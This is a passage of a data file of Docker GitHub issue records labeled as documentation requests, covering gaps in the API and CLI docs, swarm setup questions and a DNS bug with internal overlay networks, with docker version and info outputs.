(e.g. issue happens only occasionally):**\r\nNone.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n# docker version\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:58:26 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:58:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n# docker info\r\nContainers: 1\r\n Running: 0\r\n Paused: 0\r\n Stopped: 1\r\nImages: 6\r\nServer Version: 1.13.0\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 7\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-62-generic\r\nOperating System: Ubuntu 16.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 3.859 GiB\r\nName: eforgette-u16p2\r\nID: UQWP:CEW2:4P3T:AFR2:3R7U:SUL3:QH2Y:5JGY:AYIY:64YM:WRT5:AZRJ\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 14\r\n Goroutines: 22\r\n System Time: 2017-02-07T09:53:59.166981721-08:00\r\n EventsListeners: 0\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nNone."},{"labels":["documentation",null],"text":"On doc page: https://github.com/docker/docker/blob/1.13.x/docs/reference/commandline/service_create.md\r\n\r\nPlease add [this example](https://github.com/docker/docker/issues/24879#issuecomment-278044244) about how to use `--container-label`.\r\n\r\nCheers!"},{"labels":["documentation",null],"text":"The 1.13.0 docs do not describe the effect of using `--memory-swap=0`. The default is `-1` which means unlimited. Does `0` mean no swap will be allowed, or do I have to set `--memory` and `--memory-swap` to the same value to accomplish that?\r\n\r\nhttps://docs.docker.com/engine/admin/resource_constraints/#/memory-swap-details"},{"labels":["documentation",null,null],"text":"Hi, All,\r\n\r\nI found in swagger.yml and api doc, there are some missing status codes about network:\r\n\r\n```\r\nGET /networks/(id or name) misses status code of 500;\r\nDELETE /networks/(id or name) missed status code of 403;\r\n```\r\n\r\nHere is my environment, we can see that there are two network has a prefix network id of `a`:\r\n```\r\nroot@ubuntu:~# docker network ls\r\nNETWORK ID          NAME                DRIVER              SCOPE\r\nb80b14598d1f        allen               bridge              local\r\nabe5fa290b6d        allen2              bridge              local\r\ndb8dfef4e6de        allen3              bridge              local\r\na89bfaea7f72        allen4              bridge              local\r\nfd6a89aad8ff        bridge              bridge              local\r\n85ded5476b05        docker_gwbridge     bridge              local\r\nd909a9f88b4c        host                host                local\r\nz1sybtvc99hu        ingress             overlay             swarm\r\n615a39ff6c47        none                null                local\r\n```\r\nThen we send an http request like the following pic, we found the status code is 500 which is not versioned in the swagger.yml nor api docs:\r\n<img width=\"782\" alt=\"2017-02-03 1 25 57\" src=\"https://cloud.githubusercontent.com/assets/9465626/22580645/06843094-ea15-11e6-845d-92a959624c63.png\">\r\n\r\n\r\nSecond, we send a DELETE request for network `host`, then daemon will response a status code of 403 which is also not versioned in swagger.yml or api docs. Here is test pic:\r\n![wechatimg4](https://cloud.githubusercontent.com/assets/9465626/22580703/a0a774d8-ea15-11e6-8ee1-32d82da5fbd7.jpeg)\r\n\r\n**Steps to reproduce the issue:**\r\n1.\r\n2.\r\n3.\r\n\r\n**Describe the results you received:**\r\nThere is no status code 500 for api endpoint `GET /networks/(id or name), nor 404 for `DELETE /networks/(id or name)`\r\n\r\n**Describe the results you expected:**\r\nrelated status codes are versioned in doc\r\n\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nroot@ubuntu:~# docker version\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:50:17 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Tue Jan 17 09:50:17 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nroot@ubuntu:~# docker info\r\nContainers: 8\r\n Running: 0\r\n Paused: 0\r\n Stopped: 8\r\nImages: 37\r\nServer Version: 1.13.0\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 202\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: active\r\n NodeID: gkdoxio9hz1b325t544ftpry4\r\n Is Manager: true\r\n ClusterID: 3bidcebapq2115pts6cik50ah\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: 192.168.59.103\r\n Manager Addresses:\r\n  192.168.59.103:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 03e5862ec0d8d3b3f750e19fca3ee367e13c090e\r\nrunc version: 2f7393a47307a16f8cee44a37b262e8b81021e3e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\nKernel Version: 3.19.0-25-generic\r\nOperating System: Ubuntu 14.04.3 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 1.954 GiB\r\nName: ubuntu\r\nID: Q2ZC:GWDN:27OH:GRMH:G6QU:W7QP:4TIX:Q5F6:YEVK:45XP:EXHC:HOB5\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 32\r\n Goroutines: 132\r\n System Time: 2017-01-29T14:51:41.049720516+08:00\r\n EventsListeners: 0\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nRegistry Mirrors:\r\n https://a.b.c/\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n"},{"labels":[null,"documentation"],"text":"The [ARG section](https://docs.docker.com/engine/reference/builder/#/arg) says the following:\r\n\r\n>**Warning:** It is not recommended to use build-time variables for passing secrets like github keys, user credentials etc. Build-time variable values are visible to any user of the image with the docker history command.\r\n\r\nThis, however, is not very helpful. The warning should mention what to use instead when you need secrets during build time."},{"labels":[null,"documentation",null],"text":"I read the v1.25 document, but I can't find any related information.  I was wondering if \"docker stack deploy\" api was the on roadmap.  "},{"labels":["documentation"],"text":"The [configuration file documentation](https://docs.docker.com/engine/reference/commandline/cli/#/configuration-files) states\r\n\r\n> The property psFormat specifies the default format for docker ps output. When the --format flag is not provided with the docker ps command, Docker’s client uses this property. If this property is not set, the client falls back to the default table format. For a list of supported formatting directives, see the [Formatting section in the docker ps documentation](https://docs.docker.com/engine/reference/commandline/ps/)\r\n\r\nThere's no such section in the docker ps documentation."},{"labels":["documentation"],"text":"A while ago, I started contributing to docker and was able to fix few doc and cli related issues.\r\nBut was unable to pick issues related to other areas like runtime, networking, etc. It is bit difficult to know how runc, containerd, etc are used by docker in its code.\r\n\r\nFor any beginner level contributor, it becomes difficult to understand the entire code flow or even a single docker component codebase.\r\nThere are documentation available for few of the tools but it don't mention anything about the tools used internally within docker.\r\nThere should be documentation explaining all tools and technologies that docker uses internally in the code like : `runc, libnetwork, containerd, docker-containerd-shim, ctr, cobra, rootfs, etc`\r\nShould also document : how docker creates namespaces, which all system calls do docker calls internally, how docker uses runc and so on.\r\nThere should be pointers to files and repository where the code resides for each of these tools like code for rootfs related stuff, image related stuff, etc.\r\nSuch documentation will really help beginner level contributor a lot."},{"labels":[null,"documentation",null],"text":"The docs at https://docs.docker.com/engine/reference/commandline/version/ say to get the template fields for `docker version` output, use `docker version --format '{{json .}}'` which gives me:\r\n\r\n```\r\n{\"Client\":{\"Version\":\"1.13.0\",\"ApiVersion\":\"1.25\",\"GitCommit\":\"49bf474\",\"GoVersion\":\"go1.7.3\",\"Os\":\"darwin\",\"Arch\":\"amd64\",\"BuildTime\":\"Wed Jan 18 16:20:26 2017\"},\"Server\":{\"Version\":\"1.13.0\",\"ApiVersion\":\"1.25\",\"MinAPIVersion\":\"1.12\",\"GitCommit\":\"49bf474\",\"GoVersion\":\"go1.7.3\",\"Os\":\"linux\",\"Arch\":\"amd64\",\"KernelVersion\":\"4.9.5-moby\",\"Experimental\":true,\"BuildTime\":\"Wed Jan 18 16:20:26 2017\"}}\r\n```\r\n\r\nSo I try\r\n```\r\ndocker version --format '{{.Server.ApiVersion}}'\r\n\r\ntemplate: :1:9: executing \"\" at <.Server.ApiVersion>: can't evaluate field ApiVersion in type *types.Version\r\n```\r\n\r\nEventually I guess and try\r\n```\r\ndocker version --format '{{.Server.APIVersion}}'\r\n1.25\r\n```\r\n\r\nSo the output on the JSON list has a different casing, making it hard to work out what the Go names are. I blame Go's weird JSON handling, but I wonder if it can be fixed? Or maybe the docs just could add a note?\r\n\r\nActually the JSON has the same name\r\n```\r\ndocker version --format '{{json .Server.ApiVersion}}'\r\n\r\ntemplate: :1:14: executing \"\" at <.Server.ApiVersion>: can't evaluate field ApiVersion in type *types.Version\r\ndocker version --format '{{json .Server.APIVersion}}'\r\n\"1.25\"\r\n```\r\n\r\n```\r\nClient:\r\n Version:      1.13.0\r\n API version:  1.25\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      1.13.0\r\n API version:  1.25 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   49bf474\r\n Built:        Wed Jan 18 16:20:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\ncc @thaJeztah "},{"labels":["documentation"],"text":"The page https://docs.docker.com/engine/admin/logging/log_tags/ provides link `logging context` to https://github.com/docker/docker/blob/master/daemon/logger/context.go that is not available any more."},{"labels":["documentation"],"text":"'docker/' is no longer automatically added as a prefix (after https://github.com/docker/docker/pull/22384), but https://docs.docker.com/engine/admin/logging/log_tags/ still prepends 'docker/'. That log-opt tag would no longer result in the example log line. It would be missing the 'docker/' prefix."},{"labels":["documentation"],"text":"Seems like the Dockerfile reference web-page does not exist anymore or if the url has been changed google does not find it for some reason.\r\n\r\nThe page is still on github https://github.com/docker/docker/blob/master/docs/reference/builder.md"},{"labels":["documentation",null,null],"text":"I am trying to understand the resource control related to the CPUs from Swarm Mode.\r\n\r\nFrom the docs I just see:\r\nhttps://docs.docker.com/engine/reference/commandline/service_create/\r\n--limit-cpu value                Limit CPUs (default 0.000)\r\n\r\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#create-a-service\r\nNanoCPUs – CPU limit in units of 10-9 CPU shares.\r\n\r\nThe concept is completely different from the ones related to containers and I think there is a lack of documentation regarding the use of these parameters (limit-cpu and reserved-cpu)"},{"labels":["documentation",null],"text":"I'm trying to run the example in this documentation: https://godoc.org/github.com/docker/docker/client#hdr-Usage\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"fmt\"\r\n\r\n\t\"github.com/docker/docker/api/types\"\r\n\t\"github.com/docker/docker/client\"\r\n)\r\n\r\nfunc main() {\r\n\tcli, err := client.NewEnvClient()\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tcontainers, err := cli.ContainerList(context.Background(), types.ContainerListOptions{})\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\r\n\tfor _, container := range containers {\r\n\t\tfmt.Printf(\"%s %s\\n\", container.ID[:10], container.Image)\r\n\t}\r\n}\r\n```\r\n\r\nBut for obvious reasons, when running the example against the latest release of Docker, 1.12.5, that doesn't work.\r\nThe error I get is: \r\n```\r\npanic: Error response from daemon: client is newer than server (client API version: 1.26, server API version: 1.24)\r\n```\r\nI understand that semantic versioning has no significance for this project, because the API breaks in point releases, but it would be cool if at least examples would work."},{"labels":["documentation",null],"text":"https://docs.docker.com/engine/reference/commandline/tag/\r\n\r\n````\r\nA tag name may contain lowercase and uppercase characters, digits, underscores, periods and dashes. A tag name may not start with a period or a dash and may contain a maximum of 128 characters.\r\n````\r\n\r\nWhat is a character? You mean ASCII Latin letters? The use of the word \"character\" is WRONG because a character refers to ANY code point! There is also more than one character referred to as dash and underscore in unicode. That needs to be specified properly too. I know you're probably referring to ASCII and not unicode, but you never actually write that."},{"labels":["documentation",null,null],"text":"**Description**\r\nI found that `docker service update` command document is not so detailed in https://github.com/docker/docker/blob/master/docs/reference/commandline/service_update.md\r\n\r\nI think there are lots of missing options in explanation, such as `--rollback`, and so on.\r\n\r\nIn addition, in the doc it says:\r\n```\r\nThe parameters are the same as [`docker service create`](service_create.md).\r\n``` \r\n\r\nI think that is not true.\r\n\r\nHere is the evidence:\r\n```\r\nroot@ubuntu:~# docker service create --help | grep \"\\-\\-\" | wc -l\r\n45\r\nroot@ubuntu:~# docker service update --help | grep \"\\-\\-\" | wc -l\r\n57\r\n```\r\n So, there is at least 12 parameters that are not the same.\r\n\r\nI think we need a detailed `docker service update` doc for the users. "},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nThere is very little information from API documentation that can explain how to use REST request to promote or demote swarm node from remote side. It seems I should post \"/nodes/id/update\" with parameters attached. However, some parameters like 'version' are vague. Can you provide an example to show promote/demote?\r\n\r\nSomething like:\r\n`curl --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"version\": .., ..}' http:/nodes/id/update`\r\n\r\nThanks"},{"labels":["documentation",null],"text":"As far as I can tell all tutorials are for sandbox style swarm where multiple VMs run on a single physical host. I can't find a good resource that gives a simple tutorial on getting a swarm running across more than one physical machine. Maybe this would need to be done per OS, as my understanding is Windows and MacOS don't support this natively, but do when using docker-machine.\r\n\r\nIn an ideal tutorial, I think a user should be able to follow the commands on their OS, and get a swarm running across two physical hosts. \r\n\r\nFrom my Windows OS perspective, questions I'd like answered in such a tutorial (as these are areas where I'm stuck after looking at the current tutorials and also production swarm docs):\r\n* On Windows must I (or is it best practice to) use `docker-machine create --swarm etc`\r\n* What is the relationship between `docker-machine create --swarm etc`, `docker swarm etc`, `docker run swarm etc`. After trial and error I think I understand how the layers build upon each other, but an explicit description would be nice\r\n\r\nAs a final bit of context to this request, I'm trying to set up a two node swarm across two Windows hosts. I think I must use `docker-machine create --swarm etc` - and everything appears to work OK except the worker node is stuck in pending. I _think_ this is because TLS is enabled by default (and it can't be disabled, or disabling is too dangerous to provide any explanation of how to do it :P ) so that's my next thing to try... but it would be nice if there was a quick one pager that pointed out all the relevant steps."},{"labels":[null,"documentation"],"text":"The API documentation (and swagger.yaml) says `POST /images/create` can only return a 200 or a 500. Snippet from swagger.yaml:\r\n```yaml\r\n  /images/create:\r\n    post:\r\n      ...\r\n      responses:\r\n        200:\r\n          description: \"no error\"\r\n        500:\r\n          description: \"server error\"\r\n          schema:\r\n            $ref: \"#/definitions/ErrorResponse\"\r\n```\r\n\r\nHowever, it can also return a 404 if you try to pull an image and it isn't found in a registry. Here's an example:\r\n\r\n```\r\n$ curl -v --unix-socket /var/run/docker.sock -X POST 'http://localhost/images/create?fromImage=bogus'\r\n...\r\n< HTTP/1.1 404 Not Found\r\n< Api-Version: 1.25\r\n< Content-Length: 75\r\n< Content-Type: application/json\r\n< Date: Wed, 30 Nov 2016 16:54:26 GMT\r\n< Docker-Experimental: true\r\n< Server: Docker/1.13.0-rc2 (linux)\r\n<\r\n{\"message\":\"repository bogus not found: does not exist or no read access\"}\r\n...\r\n```\r\n\r\nThat 404 response should be documented."},{"labels":["documentation",null],"text":"Could we create a doc that has a table of plugins that are supported for 1.13?  Ideally in the future this should be in the hub / store but a doc to start would be great."},{"labels":["documentation",null,null],"text":"I noticed that when I created a new service using `docker swarm create`, the engine will try pulling the latest images even if the expected image is already contained in local `docker images`.\r\n\r\nSo my question is that once the service is running already with a certain scale number (such as scale=3), and then I push new latest image to registry, whether the engine automatically pull the latest image and restart the running services  serveral hours later?\r\n\r\nActually, I don't want it to automatically do updating when service is running."},{"labels":["documentation",null,null],"text":""},{"labels":[null,"documentation",null],"text":"Just adding this for discussion so that we can find how to resolve this; this occurred to me while reviewing https://github.com/docker/docker/pull/28734\r\n\r\nJekyll requires some non-standard markdown markup markers for certain parts of the documentation (`{% raw %}` / `{% end raw %}`). Before the switch to Jekyll, these markers were not needed, so it was possible to copy / re-use the same markdown for both the CLI reference, and the man-pages.\r\n\r\nIf we want to generate both the CLI docs and man-pages using the same source, we may have to make some changes so that the man-page generation understands those markers\r\n\r\n/cc @johndmulhausen @FrenchBen @dnephin @cpuguy83 "},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nWhen pulling an image, over a slow connection, with two larger layers (>40M) followed by a small layer (<10M) it can fail due to i/o timout errors.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Install docker on machine where connection can be throttled\r\n2. Throttle network to 2-3mbps\r\n3. `docker pull` image with a few larger layers\r\n\r\n**Describe the results you received:**\r\nDocker downloads three layers at a time. So initially the first three start to download. Then once one of them completes the fourth layer attempts to download, however all available bandwidth is being used by the two layers still downloading. When bandwidth is this low the request for the fourth layer fails. After a couple of retries the pull aborts with a `dial tcp ... i/o timeout` error, regardless of whether the other two layers are still successfully downloading.\r\n\r\n**Describe the results you expected:**\r\nIt would be nice to have a command line flag for `docker pull` along the lines of `--num-downloads=1` which downloads each layer one at a time. This way bandwidth would be available for each layer because the previous would've completed.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 3\r\n Running: 3\r\n Paused: 0\r\n Stopped: 0\r\nImages: 15\r\nServer Version: 1.12.3\r\nStorage Driver: devicemapper\r\n Pool Name: docker-253:1-33598067-pool\r\n Pool Blocksize: 65.54 kB\r\n Base Device Size: 10.74 GB\r\n Backing Filesystem: xfs\r\n Data file: /dev/loop0\r\n Metadata file: /dev/loop1\r\n Data Space Used: 465.2 MB\r\n Data Space Total: 107.4 GB\r\n Data Space Available: 27.72 GB\r\n Metadata Space Used: 1.294 MB\r\n Metadata Space Total: 2.147 GB\r\n Metadata Space Available: 2.146 GB\r\n Thin Pool Minimum Free Space: 10.74 GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: false\r\n Deferred Deletion Enabled: false\r\n Deferred Deleted Device Count: 0\r\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\r\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\r\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\r\n Library Version: 1.02.107-RHEL7 (2016-06-09)\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: host bridge null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: seccomp\r\nKernel Version: 3.10.0-327.36.3.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 993.3 MiB\r\nName: localhost\r\nID: QKQN:YZZU:PCRX:WO66:FGG4:LUR4:PVR5:QBLM:NKE4:B52W:ZCAU:5TRQ\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nVMware VM running Centos 7 on a home broadband connection\r\n"},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nDocker volume command documentation files do not fully describe expected behavior for contributors writing volume drivers. In particular, volume management in swarm mode can be troublesome for clustered storage systems when determining which node to create volumes and where to report volume list. This can lead to cartesian bugs when creating volumes (every node creates a volume based on the volume create request). Some plugin authors have been confused as to where to report a volume as available depending on how their storage system manages volumes.\r\n\r\n@anusha-ragunathan is aware of this and will be following up with more info.\r\n\r\nCC'ing @thaJeztah @stevvooe @vieux per Anusha's request."},{"labels":["documentation"],"text":"While it's clear how to use the `--tmpfs` flag on `docker run`, it isn't clear how to accomplish the same thing via the Remote API because the `HostConfig.Tmpfs` option is undocumented [here](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-container).\r\n\r\nIt took a fair amount of trial-and-error to figure out that it's meant to look something like this:\r\n\r\n```js\r\n'HostConfig': {\r\n  // ...\r\n  'Tmpfs': {\r\n    '/tmp': 'rw,exec' // mount options (your choice)\r\n  }\r\n}\r\n```\r\n\r\nHopefully documenting this here, and eventually in the actual API docs, will save someone else from diving through [this](https://github.com/docker/docker/blob/master/api/types/container/host_config.go)."},{"labels":["documentation",null],"text":"https://github.com/docker/docker/pull/27998 seems to have been merged with without any documentation.\r\n\r\nThere should be.\r\n\r\nShort version how to use these features to get the ball rolling:\r\n\r\n1. Make a new `docker-compose.yml` or port an existing one, with `version: '3'` explicitly specified.  Seems the \"schema\" (layout of `services`, `networks`, etc. keys) did not change much in this new version but some parameters for services are unsupported.  I'm guessing `build:` is likely not supported as well?\r\n2. Run `docker deploy --compose-file docker-compose.yml stackname`.\r\n3. `docker stack` can be used to view the generated services for the \"stack\" defined by the Docker Compose file.  e.g., `docker stack ls` to view created stacks, `docker stack services stackname` to view the services associated with that stack, etc.\r\n\r\nFYI @londoncalling @johndmulhausen "},{"labels":[null,"documentation"],"text":"## Reasoning\r\n\r\nAs part of [my work to improve the API documentation](https://github.com/docker/docker.github.io/pull/210) I realised that \"Docker Remote API\" is a bit of a confusing name. The Docker Registry serves the [Docker Registry API](https://docs.docker.com/registry/spec/api/), Docker Cloud serves the [Docker Cloud API](https://docs.docker.com/registry/spec/api/), Docker Hub has (had?) the [Docker Hub API](https://docs.docker.com/v1.7/reference/api/docker-io_api/), Docker Trusted Registry has the [Docker Trusted Registry API](https://docs.docker.com/apidocs/overview/), but Engine is the odd one out.\r\n\r\nAs far as I can see, it's a historical artefact from when \"Docker\" was just the Engine. We've since added other APIs, and the original was never given a distinctive name.\r\n\r\nBesides consistency, here are some reasons for the change:\r\n\r\n1) \"Remote\" is redundant – all HTTP APIs are remote. \"Docker API\" would collide with other Docker APIs, hence \"Docker Engine API\".\r\n2) When you want to find the API for the Engine, it's not immediately clear that you should be looking for the \"Remote API\". (And vice versa, \"Remote API\" does not make it immediately obvious that it's the thing the Engine exposes.)\r\n3) The information architecture in the documentation is a bit weird, because \"Remote API\" doesn't comfortably sit under \"Engine\".\r\n\r\n## Implementation\r\n\r\nThe only place we reference it seems to be in the documentation and CLI docs, so looks like we can just do a big ol' search and replace.\r\n\r\nThe only breakage I can think of is if people search for \"Docker Remote API\" on Google and the documentation doesn't turn up. To counteract this, we can leave it as the \"Remote API\" in old versions of the API documentation, and add \"Remote API\" to the keywords of the latest API docs. Or, just a bit of copy like: \"In version X of Docker and below, the Engine API was called the Docker Remote API.\"\r\n\r\n/cc @dnephin @johndmulhausen @icecrime @shykes "},{"labels":["documentation",null,null,null],"text":"**Description**\r\n\r\nWhen I read documentation about live-restore option I supposed that it is supported by Docker for Windows. There is no one mention that it is not supported: https://docs.docker.com/engine/admin/live-restore/\r\n\r\nFurthermore, this documentation https://docs.docker.com/engine/reference/commandline/dockerd/ lists this option in \"Windows configuration file\" section. But I was not able to configure it in both ways (as an argument of dockerd and variable of daemon.json)\r\n\r\n**Steps to reproduce the issue:**\r\n1. When I try to run dockerd with --live-restore option I got a error\r\n```\r\nPS C:\\Users\\Administrator> dockerd --live-restore --register-service\r\nStatus: unknown flag: --live-restore\r\nSee 'dockerd --help'., Code: 125\r\n```\r\n2. When I added ``` \"live-restore\": true ``` to the daemon.json and started dockerd I got another error\r\n```\r\nPS C:\\Users\\Administrator> dockerd\r\nunable to configure the Docker daemon with file C:\\ProgramData\\docker\\config\\daemon.json: the following directives don't match any configuration option: live-restore\r\n```\r\n\r\n**Expected behaviour:**\r\nI expect that dockerd should run successfully with this option. Or at least have mention in the documentation that it is not supported\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.2-cs2-ws-beta\r\n API version:  1.25\r\n Go version:   go1.7.1\r\n Git commit:   050b611\r\n Built:        Tue Oct 11 02:35:40 2016\r\n OS/Arch:      windows/amd64\r\n\r\nServer:\r\n Version:      1.12.2-cs2-ws-beta\r\n API version:  1.25\r\n Go version:   go1.7.1\r\n Git commit:   050b611\r\n Built:        Tue Oct 11 02:35:40 2016\r\n OS/Arch:      windows/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 1\r\n Running: 0\r\n Paused: 0\r\n Stopped: 1\r\nImages: 1\r\nServer Version: 1.12.2-cs2-ws-beta\r\nStorage Driver: windowsfilter\r\n Windows:\r\nLogging Driver: json-file\r\nPlugins:\r\n Volume: local\r\n Network: nat null overlay\r\nSwarm: inactive\r\nDefault Isolation: process\r\nKernel Version: 10.0 14393 (14393.321.amd64fre.rs1_release_inmarket.161004-2338)\r\nOperating System: Windows Server 2016 Datacenter\r\nOSType: windows\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 4 GiB\r\nName: EC2AMAZ-P7L1INT\r\nID: 6JSQ:WIFX:QJ25:TM5T:JBOG:CR7M:NSOW:X2AJ:QJXR:PRID:CLE2:6Q67\r\nDocker Root Dir: C:\\ProgramData\\docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nIt is a EC2 instance which was launched from \"Windows Server 2016 with containers image\""},{"labels":["documentation",null],"text":"Currently our CI does not build the man pages, so we do not know if there are issues with PRs or problems with the build process.\r\n\r\nI tried to get this to work in #25884 and it mysteriously failed, it would never download the alpine packages from CI, and no one has an explanation (it is fine locally) so it needs looking at.\r\n\r\nOnce that is fixed I can reopen the PR to put them in the `tgz`.\r\n\r\ncc @dnephin \r\n"},{"labels":["documentation",null,null,null,null],"text":"[dns_docker_issue.zip](https://github.com/docker/docker/files/579919/dns_docker_issue.zip)\r\n\r\n**Description**\r\nAfter repeatedly hitting inconsistent behavior when starting up an application infrastructure with a number of swarm mode networks and services, I narrowed it down to a reproducible use-case.  It is still occasionally inconsistent, especially on AWS for docker beta (where I hit it initially), but I am able to reliably produce the issue on a local vbox docker-machine, which I detail below.\r\n\r\n**Steps to reproduce the issue:**\r\nAlso see the attached a script that I've used to run through the issue.\r\n\r\n1. Set-up a local docker-machine, into swarm mode.  I used ...\r\ndocker-machine create --driver virtualbox --virtualbox-memory 3072 --virtualbox-disk-size 20000 net-test-machine\r\ndocker swarm init --advertise-addr <machineip>\r\n\r\n2. Set up some swarm mode networks.  The order is important.  If the internal network is last, it works.\r\ndocker network create --driver overlay test_nw_1\r\ndocker network create --driver overlay --internal test_internal_nw\r\ndocker network create --driver overlay test_nw_2\r\n\r\n3. Run a service, on which you can check DNS\r\ndocker service create --name dns-test-service --restart-max-attempts=1 --replicas=1 --network test_nw_2 alpine nslookup www.google.com\r\n\r\n4. Check the results\r\ndocker service ps dns-test-service\r\n`ID                         NAME                    IMAGE   NODE              DESIRED STATE  CURRENT STATE          ERROR\r\n8kuzzunxubqdj4nzyn3v8kuc8  dns-test-service.1      alpine  net-test-machine  Shutdown       Failed 2 seconds ago   \"task: non-zero exit (1)\"\r\n7zihw5somacz9g945j8pac79h   \\_ dns-test-service.1  alpine  net-test-machine  Shutdown       Failed 12 seconds ago  \"task: non-zero exit (1)\"`\r\n\r\nThe above service was chosen as it was concise, but I could run the same test with an 'alpine sleep', exec in, and clearly see that Internet access was ok, but hosts would not 